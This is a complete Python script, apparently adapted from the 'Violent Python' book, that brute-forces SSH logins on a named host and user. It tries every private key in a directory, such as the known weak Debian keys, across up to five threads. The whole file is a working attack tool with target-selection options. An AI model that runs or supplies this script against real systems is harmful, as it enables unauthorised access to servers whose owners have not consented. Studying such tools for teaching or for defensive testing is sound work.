#!/usr/bin/env python
import paramiko
import sys
import optparse
import os
from threading import *
maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)

# Violent Python. Dictionary attack but using paramiko (my twist of the story)
# This version tests connections using a prossible list of assym keys (in this case
# the vulnerable Debian keys (https://github.com/g0tmi1k/debian-ssh) 
# Uses threads and limits the number of connections (to 5) using semaphores 

def set_found(i):
  # Interface to modify a global variable called Found (in case the priv key was found
  global Found
  if i == 1:
    Found = True
  else:
    Found = False

def set_pfound(val):
  # And a global variable that will hold the name of the private key found (IF)
  global pFound
  pFound = val

def get_list_keys(direct):
  # Function to retrieve the list of PRIVATE keys from a folder containing
  # private and public keys (later conatining .pub in the filename)
  list_pk = []
  list_k = os.listdir(direct)
  for key in list_k:
    if str(key).find('pub') < 0:
      filename = os.path.join(direct, key)
      list_pk.append(filename)
  return list_pk

def dict_attck(host, user, key):
  # Sets up initial values (username, key)
  # Creates a "client" and loads the Keys for communicating with it
  client = paramiko.SSHClient()
  client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
  try :
    # Tries to connect using the passwords found in the list
    # If successful it will print the last passwrod tried, will set the global variables
    # to Found = True and the value of the found password. and exit
    client.connect(host, username = user, key_filename = key)
    # Will print a modest message with the found passwd...
    print '[>>>>>> +] Key file found!: %s [<<<<<<<<<]' %(key)
    set_found(1)
    set_pfound(key)
    exit(0)
  except paramiko.ssh_exception.AuthenticationException:
    # If there is an Authentication Exception (Bad password) It will print a notification
    print '[-] Failed Key: %s' %(key)
  except Exception as e:
    print '[-] Failed Key: %s' %(key)
    # In any other case (timeout, server closed connection) it will restart the client and continue the procedure
    client = paramiko.SSHClient()
    client.load_system_host_keys()
  finally:
    # In either case it will close the connection at the end (very polite)
    # And release the connection lock on the thread
    client.close()
    connection_lock.release()

def main():
  global Found
  global pFound
  # Bunch of option parsing
  p = optparse.OptionParser('Usage: %prog -H <host> -u <username> -d <Private Keys directory>')
  p.add_option('-H', dest='host', type='string', help='IP address of SSH server')
  p.add_option('-u', dest='user', type='string', help='Username to attack')
  p.add_option('-d', dest='direct', type='string', help='Dictionary file')
  (options, args) = p.parse_args()
  host = options.host
  user = options.user
  direct = options.direct
  if (host == None) or (user == None) or (direct == None):
    print p.usage
    exit(0)
  list_pk = get_list_keys(direct)
  set_found(0)
  for key in list_pk:
  # We will try to connect with each Private key retrieved from the provided directory
    if Found == True:
      # Unless the Found variable has been set to True. In wich case:
      # We will print the value of the recovered passwd and exit
      print '\n  [*] Password found: %s\n\n' %(pFound)
      exit(0)
    # Here we didn't get into the IF. for each connection we will set a lock
    # So we will start a limited number of connections to the server. 
    connection_lock.acquire()
    t = Thread(target=dict_attck, args=(host, user, key))
    t.start()
  exit(0)

if __name__ == '__main__':
  main()
